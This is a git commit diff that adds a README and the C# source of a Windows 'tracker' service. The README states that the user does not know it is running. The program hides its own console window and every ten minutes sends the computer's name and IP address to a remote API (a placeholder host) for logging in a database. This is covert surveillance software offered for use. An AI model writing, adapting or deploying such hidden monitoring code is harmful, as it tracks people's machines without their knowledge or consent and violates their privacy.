500a66f5dde9dd03216fccf1a05166a96dbc0bf1
axelnfs <mosquedaaxel1@gmail.com>
2025-03-27 21:18:00 -0600

    Descripcion breve de los cambios

--- README.md
+++ README.md
@@ -1,2 +1,56 @@
 # trackerping_service
-A tracker that make n pings in a server, register when it makes a ping in your database
+A tracker that make n pings in a server, register when it makes a ping in your database, the user don't know this, because is a hidden service for Windows.
+
+## How to use
+1. Create your own database.
+
+In this database, you can view the activity in any computer, whe frequency will depend on how long the ping is scheduled.
+
+This is an example database for SQL Server:
+
+```sql
+CREATE TABLE EquipoRemoto (
+    EquipoRemoto INT IDENTITY(1,1) PRIMARY KEY,
+    NombreEquipo VARCHAR(50) NOT NULL,
+    FechaHora DATETIME DEFAULT GETDATE(),
+    IpEquipo VARCHAR(50) NOT NULL
+)
+```
+
+You need make a API RESTFUL that make inserts in this TABLE.
+
+Is important that the API RESTFUL return the response `IsError`, `Message`, `Data` and `Data1`.
+
+2. Programming
+
+This project use C# and .NET RUNTIME (https://dotnet.microsoft.com/es-es/download), and Visual Studio 2022.
+
+You need make someone configurations, with a click in your project -> Properties:
+
+![image](https://hackmd.io/_uploads/HkA5W57a1x.png)
+
+In Assembly Name, you can change this text for the name that you need for you service:
+
+![image](https://hackmd.io/_uploads/H14JG5mTye.png)
+
+And now, in Program.cs, you can search the line 27, you need set your server where you need make ping's:
+```csharp
+
+string ipAddress = "you.api.com";`
+
+```
+
+Now, you need search execution of `EnviarDatosEquipo` in the line 40:
+```csharp
+
+await EnviarDatosEquipo(equipoInfo, "tu.api.com/EquipoRemotoPing");
+
+```
+
+equipoInfo is the model with your PC Data.
+
+You can modify the update frecuency in the line 49:
+```csharp
+
+Thread.Sleep(600000); // Wait 10 minutes
+```
---
+++ ServicioPingMersol/ServicioPingMersol/Program.cs
@@ -0,0 +1,123 @@
+﻿using System;
+using System.Net;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Text.Json;
+using System.Threading;
+using System.Threading.Tasks;
+
+class Program
+{
+    [DllImport("user32.dll")]
+    private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
+
+    private const int SW_HIDE = 0;
+
+    static async Task Main()
+    {
+        // Ocultar la consola
+        IntPtr handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+
+        string ipAddress = "you.api.com";
+        Ping pingSender = new Ping();
+
+        while (true)
+        {
+            try
+            {
+                EquipoInfo equipoInfo = ObtenerEquipoInfo();
+
+                PingReply reply = pingSender.Send(ipAddress);
+                if (reply.Status == IPStatus.Success)
+                {
+                    Console.WriteLine($"Ping a {ipAddress} - Estado: {reply.Status}");
+                    await EnviarDatosEquipo(equipoInfo, "tu.api.com/EquipoRemotoPing");
+                }
+            }
+            catch (Exception ex)
+            {
+                // Manejar la excepción sin interrumpir la ejecución del programa
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+
+            Thread.Sleep(600000); // Esperar 10 MINUTOS
+        }
+    }
+
+    private static EquipoInfo ObtenerEquipoInfo()
+    {
+        string nombreEquipo = Environment.MachineName;
+        string ipEquipo = ObtenerIpEquipo();
+
+        return new EquipoInfo
+        {
+            NombreEquipo = nombreEquipo,
+            IpEquipo = ipEquipo
+        };
+    }
+
+    private static string ObtenerIpEquipo()
+    {
+        string ipAddress = string.Empty;
+        foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
+        {
+            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+            {
+                ipAddress = ip.ToString();
+                break;
+            }
+        }
+        return ipAddress;
+    }
+
+    private static async Task EnviarDatosEquipo(EquipoInfo equipoInfo, string url)
+    {
+        try
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                string json = JsonSerializer.Serialize(equipoInfo);
+                StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
+
+                HttpResponseMessage response = await client.PostAsync(url, content);
+                string responseContent = await response.Content.ReadAsStringAsync();
+                if (response.IsSuccessStatusCode)
+                {
+                    var apiResponse = JsonSerializer.Deserialize<ApiResponse>(responseContent);
+                    Console.WriteLine($"Datos del equipo enviados exitosamente. Mensaje: {apiResponse.Message}");
+                }
+                else
+                {
+                    Console.WriteLine($"Error al enviar datos del equipo: {response.StatusCode} - {responseContent}");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            // Manejar la excepción sin interrumpir la ejecución del programa
+            Console.WriteLine($"Excepción al enviar datos del equipo: {ex.Message}");
+        }
+    }
+}
+
+public class EquipoInfo
+{
+    public string NombreEquipo { get; set; }
+    public string IpEquipo { get; set; }
+}
+
+public class ApiResponse
+{
+    public bool IsError { get; set; }
+    public string Message { get; set; }
+    public object Data { get; set; }
+    public object Data1 { get; set; }
+}
+
+
